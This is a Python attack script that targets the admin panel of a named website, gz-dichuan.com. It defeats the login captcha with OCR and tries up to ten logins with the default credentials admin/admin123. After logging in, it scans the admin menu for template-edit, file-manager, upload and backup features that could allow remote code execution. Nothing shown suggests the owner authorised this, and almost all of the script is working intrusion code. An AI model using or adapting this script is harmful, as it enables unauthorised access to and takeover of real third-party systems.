#!/usr/bin/env python3
"""gz: check for template edit / file manager / other RCE surfaces in admin"""
import urllib.request, urllib.parse, re, http.cookiejar, base64, subprocess, sys

HOST = "http://gz-dichuan.com"
UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}

def ocr(img_bytes):
    b64 = base64.b64encode(img_bytes).decode()
    code = ("import ddddocr,base64; o=ddddocr.DdddOcr(show_ad=False); "
            "print(o.classification(base64.b64decode('%s')))" % b64)
    r = subprocess.run([sys.executable, "-c", code], capture_output=True, timeout=20, cwd="/tmp")
    return r.stdout.decode().strip()

cj = http.cookiejar.CookieJar()
op = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))

def fetch(url, data=None, timeout=15, headers=None):
    h = {**UA, "Content-Type": "application/x-www-form-urlencoded"}
    if headers: h.update(headers)
    try:
        req = urllib.request.Request(url, data=data.encode() if data else None, headers=h)
        r = op.open(req, timeout=timeout)
        return r.status, r.geturl(), r.read()
    except urllib.error.HTTPError as e:
        return e.code, url, e.read()
    except Exception as ex:
        return 0, url, str(ex).encode()

for attempt in range(10):
    try:
        code, final, body = fetch(HOST + "/index.php?m=admin&c=login&a=index")
        code, final, cap = fetch(HOST + "/index.php?m=admin&c=login&a=vertify",
                                 headers={"Referer": HOST + "/index.php?m=admin&c=login&a=index"})
        cap_text = ocr(cap)
        data = urllib.parse.urlencode({"username": "admin", "password": "admin123", "vertify": cap_text})
        code, final, resp = fetch(HOST + "/index.php?m=admin&c=login&a=login", data=data,
                                  headers={"Referer": HOST + "/index.php?m=admin&c=login&a=index",
                                           "X-Requested-With": "XMLHttpRequest"})
        rt = resp.decode("utf-8", "ignore")
        if "登录成功" in rt or '"status":1' in rt:
            print("login ok")
            break
    except Exception:
        pass

# check admin index full menu again - look for template/file/setting modules
code, final, body = fetch(HOST + "/index.php?m=admin&c=index&a=index",
                          headers={"Referer": HOST + "/index.php?m=admin&c=login&a=login"})
bt = body.decode("utf-8", "ignore")
# all menu links
links = re.findall(r'href=["\'](/index\.php\?m=admin&c=[a-z]+&a=[a-z]+)["\']', bt)
print("all admin links:", sorted(set(links)))
# look for template/file/setting keywords
for kw in ["template", "tpl", "file", "upload", "setting", "config", "database", "backup", "editor", "theme", "html"]:
    if kw in bt.lower():
        print("KEYWORD FOUND:", kw)
        for m in re.finditer(kw, bt.lower()):
            i = m.start()
            print("  ...", bt[max(0,i-80):i+80].replace("\n", " ")[:150])
            break
